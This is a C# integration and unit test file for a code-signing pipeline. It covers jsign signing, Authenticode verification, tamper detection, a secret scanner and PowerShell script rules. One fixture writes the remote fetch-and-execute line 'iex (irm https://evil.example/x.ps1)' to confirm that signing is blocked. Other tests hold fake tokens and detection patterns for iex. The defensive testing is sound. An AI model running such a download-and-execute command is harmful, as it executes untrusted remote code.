using System.Text;
using AppForge.Core.Abstractions;
using AppForge.Core.Domain;
using AppForge.Core.Processes;
using AppForge.Signing;
using AppForge.Signing.Checks;
using AppForge.Signing.Providers;
using AppForge.Signing.Verification;
using AppForge.Tests.TestSupport;

namespace AppForge.Tests.Signing;

/// <summary>
/// Echte Signaturen mit jsign (Storetype PKCS12, selbstsigniertes Testzertifikat) und echte Prüfung
/// mit dem .NET-Authenticode-Inspektor. Benötigt Java + jsign (siehe README, CI installiert beides).
/// </summary>
[Trait("Category", "Integration")]
public class RealSigningTests : IDisposable
{
    private readonly TempDir _dir = new();
    private readonly InMemorySecretStore _secrets = new();
    private readonly SigningCertificateEntity _cert;
    private readonly SigningPipeline _pipeline;

    public RealSigningTests()
    {
        Assert.True(File.Exists(Tooling.JsignJar), $"jsign fehlt unter {Tooling.JsignJar} (APPFORGE_JSIGN setzen).");
        var (pfx, x) = TestCertificates.CreateCodeSigning();
        _secrets.Values["lab-pfx"] = Convert.ToBase64String(pfx);
        _secrets.Values["lab-pfx-pw"] = "Test123!";
        _cert = new SigningCertificateEntity
        {
            DisplayName = "Lab",
            Provider = SigningProviderType.Pfx,
            IsProduction = false,
            TimestampUrl = string.Empty,
            Thumbprint = x.Thumbprint,
            SettingsJson = "{\"pfxSecret\":\"lab-pfx\",\"passwordSecret\":\"lab-pfx-pw\"}",
        };
        var options = new SigningOptions { JsignPath = Tooling.JsignJar, Engine = SigningEngineKind.Jsign };
        var runner = new ProcessRunner();
        var factory = new SigningProviderFactory([new PfxSigningProvider(runner, options, _secrets)]);
        _pipeline = new SigningPipeline(options, factory, new AuthenticodeInspector(), new DevelopmentNoScanScanner());
    }

    public void Dispose()
    {
        _dir.Dispose();
        GC.SuppressFinalize(this);
    }

    [Fact]
    public async Task Script_with_umlauts_is_signed_and_verifies()
    {
        var file = _dir.File("Grüße.ps1");
        await File.WriteAllTextAsync(file, "Write-Output 'Grüße aus Zürich'\r\nexit 0\r\n", new UTF8Encoding(false));
        var inputs = new[] { new SigningInput(file) };

        var checks = await _pipeline.CheckAsync(inputs, SigningJobType.Script);
        Assert.True(checks.Passed, string.Join("; ", checks.Findings.Select(f => f.Message)));
        Assert.Contains(checks.Findings, f => f.Check == "Encoding");

        var outcome = await _pipeline.SignAsync(inputs, _cert, checks, "AppForge Test");
        Assert.True(outcome.Success, outcome.Error + "\n" + outcome.Signing?.Log);
        var v = Assert.Single(outcome.Verification);
        Assert.Equal(SignatureStatus.Valid, v.Signature.Status);
        Assert.Contains("AppForge Test Signing", v.Signature.Subject, StringComparison.Ordinal);
        Assert.NotEqual(outcome.HashesBefore.Values.Single(), outcome.HashesAfter.Values.Single());

        var bytes = await File.ReadAllBytesAsync(file);
        Assert.Equal(new byte[] { 0xEF, 0xBB, 0xBF }, bytes.Take(3));
        Assert.Contains("# SIG # Begin signature block", Encoding.UTF8.GetString(bytes), StringComparison.Ordinal);
    }

    [Fact]
    public async Task Modified_script_after_signing_is_detected()
    {
        var file = _dir.File("t.ps1");
        await File.WriteAllTextAsync(file, "Write-Output 'ok'\r\n");
        var inputs = new[] { new SigningInput(file) };
        var outcome = await _pipeline.SignAsync(inputs, _cert, await _pipeline.CheckAsync(inputs, SigningJobType.Script));
        Assert.True(outcome.Success, outcome.Error);

        var text = await File.ReadAllTextAsync(file);
        await File.WriteAllTextAsync(file, text.Replace("'ok'", "'pwned'", StringComparison.Ordinal), new UTF8Encoding(true));
        var info = await new AuthenticodeInspector().VerifyAsync(file);
        Assert.Equal(SignatureStatus.HashMismatch, info.Status);
    }

    [Fact]
    public async Task Pe_binary_is_signed_and_verifies_then_tamper_detected()
    {
        var file = _dir.File("tool.dll");
        File.Copy(typeof(RealSigningTests).Assembly.Location, file);
        var before = await new AuthenticodeInspector().VerifyAsync(file);
        Assert.Equal(SignatureStatus.NotSigned, before.Status);

        var inputs = new[] { new SigningInput(file) };
        var outcome = await _pipeline.SignAsync(inputs, _cert, await _pipeline.CheckAsync(inputs, SigningJobType.Binary));
        Assert.True(outcome.Success, outcome.Error + "\n" + outcome.Signing?.Log);
        Assert.Equal(SignatureStatus.Valid, outcome.Verification.Single().Signature.Status);

        var bytes = await File.ReadAllBytesAsync(file);
        bytes[0x200] ^= 0xFF;
        await File.WriteAllBytesAsync(file, bytes);
        Assert.Equal(SignatureStatus.HashMismatch, (await new AuthenticodeInspector().VerifyAsync(file)).Status);
    }

    [Fact]
    public async Task Pfx_is_refused_for_production_certificates()
    {
        var file = _dir.File("p.ps1");
        await File.WriteAllTextAsync(file, "Write-Output 1\r\n");
        _cert.IsProduction = true;
        var inputs = new[] { new SigningInput(file) };
        var outcome = await _pipeline.SignAsync(inputs, _cert, await _pipeline.CheckAsync(inputs, SigningJobType.Script));
        Assert.False(outcome.Success);
        Assert.Contains("gesperrt", outcome.Error, StringComparison.Ordinal);
    }

    [Fact]
    public async Task Checks_block_secrets_and_iex_so_nothing_is_signed()
    {
        var file = _dir.File("bad.ps1");
        await File.WriteAllTextAsync(file, "$password = 'Sommer2026!'\r\niex (irm https://evil.example/x.ps1)\r\n");
        var inputs = new[] { new SigningInput(file) };
        var checks = await _pipeline.CheckAsync(inputs, SigningJobType.Script);
        Assert.False(checks.Passed);
        Assert.Contains(checks.Findings, f => f.Check == "SecretScan");
        Assert.Contains(checks.Findings, f => f.Check == "ScriptRules");
        var outcome = await _pipeline.SignAsync(inputs, _cert, checks);
        Assert.False(outcome.Success);
        Assert.Null(outcome.Signing);
    }

    [Fact]
    public async Task Pfx_inspect_reads_certificate()
    {
        var info = await new PfxSigningProvider(new ProcessRunner(), new SigningOptions(), _secrets).InspectAsync(_cert);
        Assert.True(info.Reachable);
        Assert.True(info.HasCodeSigningEku);
    }
}

public class AuthenticodeInspectorTests
{
    [Fact]
    public async Task Microsoft_signed_runtime_assembly_is_recognized()
    {
        var info = await new AuthenticodeInspector().VerifyAsync(typeof(object).Assembly.Location);
        Assert.Equal(SignatureStatus.Valid, info.Status);
        Assert.Contains("Microsoft", info.Subject, StringComparison.Ordinal);
        Assert.True(info.HasTimestamp);
    }

    [Fact]
    public async Task Unsigned_script_is_not_signed()
    {
        using var dir = new TempDir();
        var f = dir.File("x.ps1");
        await File.WriteAllTextAsync(f, "Write-Output 1");
        Assert.Equal(SignatureStatus.NotSigned, (await new AuthenticodeInspector().VerifyAsync(f)).Status);
    }

    [Fact]
    public async Task Broken_signature_block_is_reported()
    {
        using var dir = new TempDir();
        var f = dir.File("x.ps1");
        await File.WriteAllTextAsync(f, "Write-Output 1\r\n# SIG # Begin signature block\r\n# !!!notbase64\r\n# SIG # End signature block\r\n");
        Assert.Equal(SignatureStatus.HashMismatch, (await new AuthenticodeInspector().VerifyAsync(f)).Status);
    }
}

public class ScriptCheckTests
{
    [Fact]
    public void Encoding_normalization_converts_utf16_and_latin1()
    {
        using var dir = new TempDir();
        var a = dir.File("a.ps1");
        File.WriteAllText(a, "Grüße", Encoding.Unicode);
        Assert.True(ScriptEncoding.NormalizeToUtf8Bom(a));
        Assert.Equal("Grüße", File.ReadAllText(a));
        Assert.False(ScriptEncoding.NormalizeToUtf8Bom(a));

        var b = dir.File("b.ps1");
        File.WriteAllBytes(b, Encoding.Latin1.GetBytes("Grüße"));
        Assert.True(ScriptEncoding.NormalizeToUtf8Bom(b));
        Assert.Equal("Grüße", File.ReadAllText(b));
    }

    [Theory]
    [InlineData("$token = 'ghp_abcdefghijklmnopqrstuvwxyz0123456789'", true)]
    [InlineData("$c = 'DefaultEndpointsProtocol=https;AccountKey=abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUV=='", true)]
    [InlineData("$password = 'Sommer2026!'", true)]
    [InlineData("$password = $env:PASSWORD", false)]
    [InlineData("Write-Output 'hello'", false)]
    [InlineData("$uri = 'https://contoso.webhook.office.com/webhookb2/abc'", true)]
    public void Secret_scanner(string line, bool expected)
    {
        using var dir = new TempDir();
        var f = dir.File("s.ps1");
        File.WriteAllText(f, line);
        Assert.Equal(expected, SecretScanner.Scan(f).Count > 0);
    }

    [Theory]
    [InlineData("Invoke-Expression $x", true)]
    [InlineData("iex $x", true)]
    [InlineData("$text = 'iex is bad'  # Kommentar iex", false)]
    [InlineData("Get-Item . # iex", false)]
    [InlineData("ConvertTo-SecureString 'P@ss' -AsPlainText -Force", true)]
    public void Script_rules(string line, bool hasError)
    {
        using var dir = new TempDir();
        var f = dir.File("r.ps1");
        File.WriteAllText(f, line);
        Assert.Equal(hasError, ScriptRules.Check(f).Any(x => x.Severity == CheckSeverity.Error));
    }

    [Fact]
    public void Intune_remediation_rules()
    {
        using var dir = new TempDir();
        var detect = dir.File("detect.ps1");
        var remediate = dir.File("remediate.ps1");
        File.WriteAllText(detect, "if (Test-Path C:\\x) { Write-Output 'ok'; exit 0 } else { Write-Output 'missing'; exit 1 }");
        File.WriteAllText(remediate, "$a = Read-Host 'x'");
        var findings = IntuneScriptRules.CheckRemediationPair(detect, remediate);
        Assert.DoesNotContain(findings, f => f.Severity == CheckSeverity.Error && f.File == "detect.ps1");
        Assert.Contains(findings, f => f.Severity == CheckSeverity.Error && f.File == "remediate.ps1");

        File.WriteAllText(detect, "Write-Output 'immer gut'");
        Assert.Contains(IntuneScriptRules.CheckRemediationPair(detect, null), f => f.Message.Contains("exit 1", StringComparison.Ordinal));
    }

    [Fact]
    public void Analyzer_json_is_parsed()
    {
        var findings = PsScriptAnalyzer.Parse("[{\"RuleName\":\"PSAvoidUsingCmdletAliases\",\"Severity\":\"Warning\",\"Line\":3,\"Message\":\"x\"}]");
        var f = Assert.Single(findings);
        Assert.Equal(3, f.Line);
        Assert.Empty(PsScriptAnalyzer.Parse(string.Empty));
    }

    [Fact]
    public void Defender_for_storage_result_interpretation()
    {
        Assert.True(DefenderForStorageScanner.Interpret("No threats found").Clean);
        Assert.False(DefenderForStorageScanner.Interpret("Malicious").Clean);
    }

    [Fact]
    public void Certificate_expiry_thresholds()
    {
        var now = DateTimeOffset.UtcNow;
        Assert.Equal(60, CertificateFacts.ExpiryWarningThreshold(now.AddDays(45), now));
        Assert.Equal(30, CertificateFacts.ExpiryWarningThreshold(now.AddDays(20), now));
        Assert.Equal(7, CertificateFacts.ExpiryWarningThreshold(now.AddDays(3), now));
        Assert.Equal(0, CertificateFacts.ExpiryWarningThreshold(now.AddDays(-1), now));
        Assert.Null(CertificateFacts.ExpiryWarningThreshold(now.AddDays(100), now));
    }

    [Fact]
    public async Task Cert_store_provider_refuses_on_linux_with_clear_message()
    {
        if (OperatingSystem.IsWindows())
        {
            return;
        }

        var p = new CertStoreSigningProvider(new RecordingProcessRunner(), new SigningOptions());
        var r = await p.SignAsync(new SigningRequest(["a.ps1"], new SigningCertificateEntity { ProviderRef = "AB CD" }));
        Assert.False(r.Success);
        Assert.Contains("Windows-Worker", r.Files[0].Error, StringComparison.Ordinal);
    }

    [Fact]
    public async Task External_ca_plugin_builds_jsign_call_with_secrets()
    {
        var secrets = new InMemorySecretStore();
        secrets.Values["dc-key"] = "api-key-123";
        var runner = new RecordingProcessRunner();
        var options = new SigningOptions();
        var provider = new ExternalCaSigningProvider(runner, options, [new JsignExternalCaPlugin(secrets, options)]);
        var cert = new SigningCertificateEntity
        {
            Provider = SigningProviderType.ExternalCa,
            ProviderRef = "key-alias",
            SettingsJson = "{\"storetype\":\"digicertone\",\"keystore\":\"https://one.digicert.com\",\"storepassSecret\":\"dc-key\",\"certfile\":\"/certs/chain.p7b\"}",
        };
        var r = await provider.SignAsync(new SigningRequest(["/w/a.exe"], cert));
        Assert.True(r.Success);
        var call = Assert.Single(runner.Calls);
        Assert.Contains("DIGICERTONE", call.Arguments);
        Assert.Contains("key-alias", call.Arguments);
        Assert.Equal("api-key-123", call.Environment![AppForge.Signing.Engines.JsignCommand.StorePassVariable]);
        Assert.DoesNotContain("api-key-123", r.Log, StringComparison.Ordinal);
    }
}
